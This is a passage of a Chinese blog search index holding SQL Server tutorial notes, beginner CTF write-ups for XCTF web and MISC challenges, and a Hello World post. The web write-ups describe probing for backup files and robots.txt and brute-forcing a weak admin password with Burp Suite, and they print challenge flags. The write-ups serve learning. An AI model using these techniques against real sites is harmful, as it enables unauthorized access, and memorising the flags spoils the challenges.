spellcheck="true">#文件路径，最后文件格式为.ndf</span>   SIZE <span class="token operator">=</span> 10MB<span class="token punctuation">,</span>        MAXSIZE <span class="token operator">=</span> UNLIMITED<span class="token punctuation">,</span>   FILEGROWTH <span class="token operator">=</span> <span class="token number">10</span><span class="token operator">%</span><span class="token punctuation">)</span>LOG <span class="token keyword">ON</span>   <span class="token comment" spellcheck="true">#日志文件</span><span class="token punctuation">(</span>    NAME<span class="token operator">=</span><span class="token string">'test1_log'</span><span class="token punctuation">,</span>    FILENAME<span class="token operator">=</span><span class="token string">'E:\sql lianxi\test1_log.ldf'</span><span class="token punctuation">,</span>    SIZE<span class="token operator">=</span>50MB<span class="token punctuation">,</span>    MAXSIZE<span class="token operator">=</span>100MB<span class="token punctuation">,</span>    FILEGROWTH<span class="token operator">=</span>10MB<span class="token punctuation">)</span></code></pre><h1 id="二-修改及删除数据库"><a href="#二-修改及删除数据库" class="headerlink" title="二.修改及删除数据库"></a>二.修改及删除数据库</h1><pre class=" language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">// </span><span class="token keyword">ALTER</span> <span class="token keyword">DATABASE</span> test1  <span class="token comment" spellcheck="true">#需要更改的数据库名字test1</span> <span class="token keyword">ADD</span>  FILEGROUP  test1_Group2   <span class="token comment" spellcheck="true">#指定要增加的数据文件</span> GO<span class="token keyword">ALTER</span> <span class="token keyword">DATABASE</span> test1  <span class="token keyword">ADD</span> <span class="token keyword">FILE</span>  <span class="token comment" spellcheck="true">#增加文件</span><span class="token punctuation">(</span>     NAME <span class="token operator">=</span> <span class="token string">'test1_dat3'</span><span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">#文件名</span>   FILENAME <span class="token operator">=</span> <span class="token string">'D:\data\Store3add.ndf'</span><span class="token punctuation">,</span>   <span class="token comment" spellcheck="true">#文件路径</span>   SIZE <span class="token operator">=</span> 2MB<span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">#文件初始大小</span>   MAXSIZE <span class="token operator">=</span> 10MB<span class="token punctuation">,</span>      <span class="token comment" spellcheck="true">#文件最大大小</span>   FILEGROWTH <span class="token operator">=</span> 1MB   <span class="token comment" spellcheck="true">#文件增量大小</span><span class="token punctuation">)</span><span class="token keyword">TO</span>  FILEGROUP  test1_Group2   <span class="token comment" spellcheck="true">#指定该文件是属于哪个文件组的</span><span class="token keyword">ALTER</span> <span class="token keyword">DATABASE</span>  test1<span class="token keyword">MODIFY</span>  <span class="token keyword">FILE</span>   <span class="token comment" spellcheck="true">#指定要更改的文件属性</span><span class="token punctuation">(</span>   NAME<span class="token operator">=</span> test1_dat3<span class="token punctuation">,</span>MAXSIZE <span class="token operator">=</span> 100MB  <span class="token comment" spellcheck="true">#将test_dat3文件的最大大小改为100M</span><span class="token punctuation">)</span><span class="token keyword">ALTER</span> <span class="token keyword">DATABASE</span>  test1REMOVE  <span class="token keyword">FILE</span>  test1_dat3   <span class="token comment" spellcheck="true">#删除文件test1_dat3</span><span class="token keyword">ALTER</span> <span class="token keyword">DATABASE</span>  test1 REMOVE FILEGROUP test1_Group2   <span class="token comment" spellcheck="true">#删除文件组test1_Group2</span><span class="token keyword">ALTER</span> <span class="token keyword">DATABASE</span> test1<span class="token keyword">MODIFY</span> NAME <span class="token operator">=</span> test2   <span class="token comment" spellcheck="true">#重命名数据库test1名字为test2</span><span class="token keyword">DROP</span> <span class="token keyword">DATABASE</span> test1 <span class="token comment" spellcheck="true">#删除数据库test1</span></code></pre><h1 id="三-表的创建，修改及删除"><a href="#三-表的创建，修改及删除" class="headerlink" title="三.表的创建，修改及删除"></a>三.表的创建，修改及删除</h1><h2 id="1-表的创建"><a href="#1-表的创建" class="headerlink" title="1.表的创建"></a>1.表的创建</h2><pre class=" language-sql"><code class="language-sql"><span class="token keyword">USE</span> StoreSales             <span class="token comment" spellcheck="true">#使用StoreSales数据库</span><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> Employee   <span class="token comment" spellcheck="true">#创建Employee表</span><span class="token punctuation">(</span>   EmplID char<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span> <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#列名，数据类型，是否为空，主键</span>   EmplName char<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>   Sex char<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>    Birthday <span class="token keyword">date</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>   Address char<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>   Wages money <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>   DeptID char<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">)</span>GO</code></pre><h2 id="2-修改表"><a href="#2-修改表" class="headerlink" title="2.修改表"></a>2.修改表</h2><pre class=" language-sql"><code class="language-sql"><span class="token keyword">USE</span> StoreSales      <span class="token comment" spellcheck="true">#使用StoreSales数据库</span><span class="token keyword">ALTER</span> <span class="token keyword">TABLE</span> Goods2 <span class="token keyword">ADD</span> Remarks char<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">#增加列Remarks,数据类型为char(10)</span><span class="token keyword">ALTER</span> <span class="token keyword">TABLE</span> Goods2 <span class="token keyword">ALTER</span> <span class="token keyword">COLUMN</span> Remarks char<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#修改Remarks列的数据类型为char(12)</span><span class="token keyword">ALTER</span> <span class="token keyword">TABLE</span> Goods2  <span class="token keyword">DROP</span> <span class="token keyword">COLUMN</span> Remarks <span class="token comment" spellcheck="true">#删除Remarks列</span></code></pre><h2 id="3-删除表"><a href="#3-删除表" class="headerlink" title="3.删除表"></a>3.删除表</h2><pre class=" language-sql"><code class="language-sql"> <span class="token keyword">DROP</span> <span class="token keyword">TABLE</span> table_name</code></pre><h2 id="4-插入语句"><a href="#4-插入语句" class="headerlink" title="4.插入语句"></a>4.插入语句</h2><pre class=" language-sql"><code class="language-sql"><span class="token keyword">USE</span> Store<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> Consumer <span class="token keyword">values</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'刘宇豪'</span><span class="token punctuation">,</span><span class="token string">'男'</span><span class="token punctuation">,</span><span class="token string">'仁厚街21号'</span><span class="token punctuation">)</span>由于插入的数据包含各列的值并按表中各列的顺序列出这些值，所以省略列名表<span class="token punctuation">(</span>colume_list<span class="token punctuation">)</span>。</code></pre><pre class=" language-sql"><code class="language-sql"><span class="token keyword">USE</span> Store<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> Consumer <span class="token punctuation">(</span>ConsumerID<span class="token punctuation">,</span> Name<span class="token punctuation">,</span> Sex<span class="token punctuation">,</span> Address<span class="token punctuation">)</span> <span class="token keyword">values</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'刘宇豪'</span><span class="token punctuation">,</span><span class="token string">'男'</span><span class="token punctuation">,</span><span class="token string">'仁厚街21号'</span><span class="token punctuation">)</span>本例与上例功能完全相同，但本例显式列出列名表<span class="token punctuation">(</span>colume_list<span class="token punctuation">)</span>，显示列表可用于插入值少于列的个数或插入与列的顺序不同的数据。</code></pre><h2 id="5-修改语句"><a href="#5-修改语句" class="headerlink" title="5.修改语句"></a>5.修改语句</h2><p>【例】 在Consumer表中将ConsumerID为1的客户的Address修改为’沙湾路35号’。</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">USE</span> Store  <span class="token comment" spellcheck="true">#使用Store数据库</span><span class="token keyword">UPDATE</span> Consumer   <span class="token comment" spellcheck="true">#指定修改的表</span><span class="token keyword">SET</span> Address <span class="token operator">=</span><span class="token string">'沙湾路35号'</span>  <span class="token comment" spellcheck="true">#先写修改内容</span><span class="token keyword">WHERE</span> ConsumerID<span class="token operator">=</span><span class="token number">1</span>   <span class="token comment" spellcheck="true">#再指定是修改哪个</span></code></pre><p>【例】删除Consumer表中客户号为1的记录。</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">USE</span> Store<span class="token keyword">DELETE</span> Consumer  <span class="token comment" spellcheck="true">#删除Consumer表中的内容</span><span class="token keyword">WHERE</span> ConsumerID<span class="token operator">=</span><span class="token number">1</span><span class="token comment" spellcheck="true">#若没有指定修改内容，则删除所有行</span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 数据库笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql server </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界web新手练习区</title>
      <link href="posts/7834.html"/>
      <url>posts/7834.html</url>
      
        <content type="html"><![CDATA[<p>写在前面：本人CTF小白，在web方面的水平更是不高，因此如果文中有不足之处，还请指出。写本文主要有两个目的：一是防止自己将做过的题目知识点遗忘，二是希望可以在一定程度上帮助到像我一样的小白。</p><p>本文习题均出自攻防世界的MISC新手区，链接如下：<br><a href="https://adworld.xctf.org.cn/">攻防世界</a></p><h1 id="1-view-source"><a href="#1-view-source" class="headerlink" title="1.view_source"></a>1.view_source</h1><p>题目中说右键不好用了，意思是说无法通过点击鼠标右键进行查看网页源代码了。我们可以采取另外一种方式进行查看：F12键。<br>flag就藏在网页源码中：<br><img src="https://img-blog.csdnimg.cn/20200403193841183.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70"></p><blockquote><p>cyberpeace{782d7f32db8d52c32523074c085ed65a}</p></blockquote><h1 id="2-robots"><a href="#2-robots" class="headerlink" title="2.robots"></a>2.robots</h1><p>题目中提示为“Robots协议”，如果不了解的，可以上网查一下，以下是百度百科中的解释：<br><img src="https://img-blog.csdnimg.cn/2020040319422837.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70">于是在所给网址<a href="http://111.198.29.45:58686后面加上/robots.txt,访问页面，得到一串字符：">http://111.198.29.45:58686后面加上/robots.txt,访问页面，得到一串字符：</a><br><img src="https://img-blog.csdnimg.cn/2020040319485961.png">但是尝试过后，这还不是最后的答案，这是一个php文件，因此我们在原网站<a href="http://111.198.29.45:58686后加上f1ag_1s_h3re.php,进行访问,就能得到最终的flag">http://111.198.29.45:58686后加上f1ag_1s_h3re.php,进行访问,就能得到最终的flag</a>:</p><blockquote><p>cyberpeace{a60efe32de5beccdeadbeca3be9b29ed}</p></blockquote><h1 id="3-backup"><a href="#3-backup" class="headerlink" title="3.backup"></a>3.backup</h1><p>首先打开网址，发现一句话“你知道index.php的备份文件名吗？”首先判断这是一个php文件，于是在网址后加上index.php进行访问，发现页面并没有发生变化。于是重新思考这句话，考虑到文件还有扩展名，常见的备份文件后缀名有.git.svn.swp.~.bak.bash_history,逐一尝试后发现加上备份文件的扩展名.bak可以，即我们最终访问的网址为<a href="http://111.198.29.45:35364/index.php.bak%EF%BC%8C%E8%AE%BF%E9%97%AE%E5%90%8E%E4%BC%9A%E8%AE%A9%E4%BD%A0%E4%B8%8B%E8%BD%BD%E4%B8%80%E4%B8%AA%E6%96%87%E4%BB%B6%EF%BC%8C%E5%9C%A8%E4%B8%8B%E8%BD%BD%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%AD%E6%89%BE%E5%88%B0flag">http://111.198.29.45:35364/index.php.bak，访问后会让你下载一个文件，在下载的文件中找到flag</a>:<br><img src="https://img-blog.csdnimg.cn/20200403200330127.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70"></p><blockquote><p>Cyberpeace{855A1C4B3401294CB6604CCC98BDE334}</p></blockquote><h1 id="4-cookie"><a href="#4-cookie" class="headerlink" title="4.cookie"></a>4.cookie</h1><p>打开网址，看见一句话“你知道什么是cookie吗？”，我还真的不知道，于是上网去查：cookie （储存在用户本地终端上的数据）,虽然不是很懂，但有了前几个题的经验，我们还把它当做php文件试一下，在网址后加上cookie.php,访问后得到了一句新的话“See the http response”（查看http响应 ）,于是按F12，在控制台中查看htttp响应，成功找到flag:<br><img src="https://img-blog.csdnimg.cn/20200403201831725.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70"></p><blockquote><p>cyberpeace{fbd81c539270701d8c97107a12dda413}</p></blockquote><h1 id="5-disabled-button"><a href="#5-disabled-button" class="headerlink" title="5.disabled_button"></a>5.disabled_button</h1><p>网页打开后有一个写着“flag”的按钮，根据题意，只要可以点击这个按钮，就能得到flag，于是查看源代码，进行代码审计，查看这个按钮不能点的原因.<img src="https://img-blog.csdnimg.cn/20200403202507910.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现网页代码中的disabled=””，判断是这一代码导致按钮失灵，于是将其删去，发现网页中的按钮可以点击，点击按钮，得到flag:<br><img src="https://img-blog.csdnimg.cn/20200403202630485.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70"></p><blockquote><p>cyberpeace{c890c3014aa2feb593addda1c9d92e63}</p></blockquote><h1 id="6-weak-auth"><a href="#6-weak-auth" class="headerlink" title="6.weak_auth"></a>6.weak_auth</h1><p>打开网页，需要输入用户名和密码。<br><img src="https://img-blog.csdnimg.cn/20200403203405661.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70"><br>根据题目中“随手设的密码”可以判断是弱密码，即比较简单的密码，可以通过暴力破解的手段进行获取。首先随便输入一个用户名和密码，访问得到：<br><img src="https://img-blog.csdnimg.cn/20200403203916838.png"></p><p>因此得知用户名为admin,只需要爆破得到密码即可。<br>具体爆破流程，由于本人经验爆破不足，请参考大佬的文章：<br><a href="https://blog.csdn.net/weixin_33973609/article/details/93629053">渗透测试_利用Burp爆破用户名与密码</a><br>这篇文章中对使用Burp Suite爆破进行了详细的讲解，让我受益很多。<br>附上Burp Suite免费版下载地址：<a href="https://portswigger.net/burp/communitydownload">下载地址</a><br>爆破的总体思想就是让系统一个一个地去进行尝试，最后得到答案，因此只能当答案形式比较简单的时候才比较有效。<br><img src="https://img-blog.csdnimg.cn/20200403204845594.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70">最后试出密码为123456，然后在原网页输入用户名admin和密码123456，访问得到falg:</p><blockquote><p>cyberpeace{fd7119a8473439c6a099cbef4cf22cde}</p></blockquote><p>最后，期待和大家共同进步！</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web,CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界MISC新手区</title>
      <link href="posts/63376df9.html"/>
      <url>posts/63376df9.html</url>
      
        <content type="html"><![CDATA[<p>@<a href="%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CMISC%E6%96%B0%E6%89%8B%E5%8C%BA%E5%89%8D%E5%85%AD%E9%A2%98">TOC</a><br>写在前面：本人CTF小白，能写出这篇文章需要感谢CSDN其他前辈的文章和攻防世界中前辈的wp，如果文中有不对的地方，多谢各位指出。</p><p>本文习题均出自攻防世界的MISC新手区，链接如下：<br><a href="https://adworld.xctf.org.cn/">攻防世界</a></p><p>有一位前辈的文章对我有很大帮助，包含了很多CTF的解码方式，我把网址放在前面，希望对和我一样刚开始接触CTF的小白一些帮助。<br><a href="https://blog.csdn.net/qq_41638851/article/details/100526839#0x017_64">CTF中常见密码题解密网站总结</a></p><h1 id="1-this-is-flag"><a href="#1-this-is-flag" class="headerlink" title="1.this is flag"></a>1.this is flag</h1><p>答案就在题目中。</p><blockquote><p>flag{th1s_!s_a_d4m0_4la9}</p></blockquote><h1 id="2-pdf"><a href="#2-pdf" class="headerlink" title="2.pdf"></a>2.pdf</h1><p>题目中说图下面什么也没有，我们就猜测图下面有东西。为了看到图片下面的东西，我们将下载的PDF文件转换成word文件，可以看到图片下隐藏的flag。将图片移开，看的更加清楚。下面附上一个可以在线将PDF文件转换成word文件的网站：</p><p><a href="https://app.xunjiepdf.com/pdf2word/">pdf转word在线转换</a><img src="https://img-blog.csdnimg.cn/20200321171508920.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70" alt="这是将图片移开之后的截图"></p><blockquote><p>flag{security_through_obscurity}</p></blockquote><h1 id="3-gif"><a href="#3-gif" class="headerlink" title="3.gif"></a>3.gif</h1><p>打开文件，发现里面有很多黑色图片和白色图片，和二进制中的1和0很像，于是黑图片为1，白图片为0，得到一串二进制数，将二进制转为字符，就能得到flag。（有的编程大佬可以通过写脚本来直接生成flag，这里由于本人实力有限，只能一个一个对照。本人正在学python,等我会写脚本了，再来补充。）<br>附二进制转文本网站<br><a href="http://www.txttool.com/wenben_binarystr.asp">二进制转文本</a><br><img src="https://img-blog.csdnimg.cn/20200321194314342.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70"></p><blockquote><p>flag{FuN_giF}</p></blockquote><h1 id="4-如来十三掌"><a href="#4-如来十三掌" class="headerlink" title="4.如来十三掌"></a>4.如来十三掌</h1><p>打开文件得到一段玄乎的文字，这种编码被称为“与佛论禅”，通过与佛论禅编码，可以得到一串新的编码。<br>这里提醒两点：<br>1.要在编码前加上“佛曰：”<br>2.解码时注意密文在解码网站上的位置不要弄错了，本人就是一开始位置放错了，一直显示解码失败。<br>附上与佛论禅解码网站：<br><a href="http://www.keyfc.net/bbs/tools/tudoucode.aspx">与佛论禅解码</a><br><img src="https://img-blog.csdnimg.cn/20200321200544714.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70" alt="与佛论禅"><br>然后注意到题目是“如来十三掌”，这个“如来”对应的是“与佛论禅”，这个“十三”对应的是另一种叫做“ROT13”的编码。ROT13编码后得到一串代码。<br>附ROT13编码网站：<a href="https://www.qqxiuzi.cn/bianma/ROT5-13-18-47.php">ROT13编码</a><br><img src="https://img-blog.csdnimg.cn/20200321201534921.png" alt="ROT13编码">这依然不是最后的答案，最后再用一种最常见的编码形式：base64,就可以得到最后的flag。<br>附base64解码网站：<br><a href="https://base64.supfree.net/">base64解码</a><br><img src="https://img-blog.csdnimg.cn/20200321202746506.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70" alt="base64编码"></p><blockquote><p>flag{bdscjhbkzmnfrdhbvckijndskvbkjdsab}</p></blockquote><h1 id="5-give-you-flag"><a href="#5-give-you-flag" class="headerlink" title="5.give_you_flag"></a>5.give_you_flag</h1><p>下载附件中的动态图。从中可以看出动态图中有一张图片里有二维码。于是使用ps打开动态图，在右下角的图层中找到了带有动态图的图层。却发现这张二维码是不完整的（缺少了三个角位置处的定位符）于是在网上随便找一个完整的普通二维码，利用ps将三个定位符截下来补充到不完整的二维码中。扫描二维码，得到flag.</p><p>下图为不完整的二维码图。<br><img src="https://img-blog.csdnimg.cn/20200321173356254.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70" alt="不完整的二维码">    下图为还原后的二维码图。<br><img src="https://img-blog.csdnimg.cn/20200321173453520.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70"></p><blockquote><p>flag{e7d478cf6b915f50ab1277f78502a2c5}</p></blockquote><h1 id="6-坚持60s"><a href="#6-坚持60s" class="headerlink" title="6.坚持60s"></a>6.坚持60s</h1><p>  下载附件，是一个.jar类型的，是一个小游戏。这里我们需要一个反编译器，查看小游戏的源代码。这里我用的是jd-gui。根据源码来看，这个游戏坚持60s后还真能得到flag,想试试的可以试一下，本人最多到三十多秒就不行了。<br>  附上下载链接： <a href="https://jd-gui.apponic.com/">jd-gui</a><br>  在源代码里找到flag：<br>  <img src="https://img-blog.csdnimg.cn/20200321204915639.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70" alt="源代码"></p><blockquote><p>flag{RGFqaURhbGlfSmlud2FuQ2hpamk=}</p></blockquote><p>  这是本人在CSDN中发布的第一篇文章，希望和大家一起进步。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="posts/4a17b156.html"/>
      <url>posts/4a17b156.html</url>
      
        <content type="html"><![CDATA[<pre><code>Hello Word！#世界，你好！</code></pre><h2 id="Hello-Word作为广大初学者所编写的第一个程序，作为我的第一篇博客再合适不过了。希望我可以不忘初心，一直坚持下去。"><a href="#Hello-Word作为广大初学者所编写的第一个程序，作为我的第一篇博客再合适不过了。希望我可以不忘初心，一直坚持下去。" class="headerlink" title="Hello Word作为广大初学者所编写的第一个程序，作为我的第一篇博客再合适不过了。希望我可以不忘初心，一直坚持下去。"></a>Hello Word作为广大初学者所编写的第一个程序，作为我的第一篇博客再合适不过了。希望我可以不忘初心，一直坚持下去。</h2><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Hello World </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hello World </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
